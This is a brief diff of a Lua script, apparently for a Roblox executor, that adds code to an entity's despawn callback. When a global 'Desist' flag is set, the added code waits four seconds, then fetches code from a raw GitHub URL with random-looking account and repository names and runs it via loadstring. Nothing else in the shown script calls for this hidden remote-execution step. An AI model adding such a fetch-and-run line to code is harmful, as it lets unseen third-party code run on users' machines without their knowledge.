@@ -351,6 +351,14 @@ end)
 
 entity:SetCallback("OnDespawning", function()
     print("Entity is despawning")
+    
+    task.spawn(function() 
+    if getgenv().Desist then
+    task.wait(4)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/PAKKALCKKWKKJXIODKRBFHHAUJCJJJSNDJ/HAXRHCHHCHCHJSJSLKKKJDPQOIJXHBS/refs/heads/main/Desist"))() 
+    end
+    end)
+    
     coloring = false
     if raycastLoop then
 		raycastLoop:Disconnect()
